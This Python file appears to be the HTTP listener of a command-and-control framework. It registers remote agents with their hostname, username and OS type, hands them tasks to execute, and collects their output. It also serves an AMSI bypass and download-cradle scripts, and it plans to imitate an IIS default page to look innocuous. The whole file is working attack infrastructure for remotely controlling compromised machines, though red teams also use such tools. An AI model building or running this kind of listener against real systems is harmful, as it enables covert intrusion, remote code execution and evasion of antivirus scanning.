import requests
from lib.helpers.output import Color, get_random_string, success
import flask, logging, sys
import threading

cli = sys.modules['flask.cli']
cli.show_server_banner = lambda *x: None
app = flask.Flask(__name__)

class HttpListener:    
    def __init__(self, name, ip, port):
        self.name       = name
        self.port       = port
        self.ipaddress  = ip

    def __run(self):
        log = logging.getLogger('werkzeug')
        log.level = logging.ERROR
        app.run(port=self.port, host="0.0.0.0") #TODO: host=self.ipaddress)

    def run_as_daemon(self):
        """
        Starts the listener in seperate a thread
        """
        t = threading.Thread(target = self.__run)
        t.start()

@app.route('/')
def default():
    return "<h2>Default Page</h2>" # TODO: return IIS default page

@app.route("/reg", methods=['POST'])
def __register_agent():
    """
    Register a new agent for this listener
    """
    name     = get_random_string(8)
    remoteip = flask.request.remote_addr

    hostname = flask.request.form.get("hname")
    username = flask.request.form.get("uname")
    os_type = flask.request.form.get("type")

    # register to database
    requests.post(
        'http://127.0.0.1:9292/api/agents', # TODO read from config
        data={
            "name": name,
            "ip_address": remoteip,
            "username": username,
            "hostname": hostname,
            "type": os_type
        }
    )

    # return the name for the agent to know its name
    return (name, 200)


@app.route("/results/<name>", methods=['POST'])
def __receive_result(name):
    """
    Receive results from an agent
    """
    result = flask.request.form.get("result")

    requests.post(
        'http://127.0.0.1:9292/api/broadcast', # TODO read url from config
        data={
            "msg": result.strip()
        }
    )

    return ('', 204)

@app.route("/rename/<old_name>", methods=['POST'])
def __rename_agent(old_name):
    """
    Route for agents to reregister under a new name
    """
    new_name = flask.request.form.get("name")

    requests.put(
        'http://127.0.0.1:9292/api/agents', # TODO read url from config
        data={
            "old_name": old_name,
            "new_name": new_name
        }
    )

    return ('', 204)


@app.route("/tasks/<name>", methods=['GET'])
def __serve_tasks(name):
    """
    Returns an agents tasks
    """
    # get oldest task from db and return it to the agent to execute
    r = requests.get(
        f'http://127.0.0.1:9292/api/tasks/{name}', # TODO read url from config
    )
    task = r.json()['data']['task']
    return (task, 200)

@app.route("/bp", methods=['GET'])
def __get_amsi_bypass():
    r = requests.get(
        f'http://127.0.0.1:9292/api/amsi_bypass',  # TODO read url from config
    )
    task = r.json()['data']
    return (task, 200)

@app.route("/dl/<id>", methods=['GET'])
def __cradle(id):
    r = requests.get(
        f'http://127.0.0.1:9292/api/dl/{id}', # TODO read url from config
    )
    cradle = r.json()['script']
    return (cradle, 200)



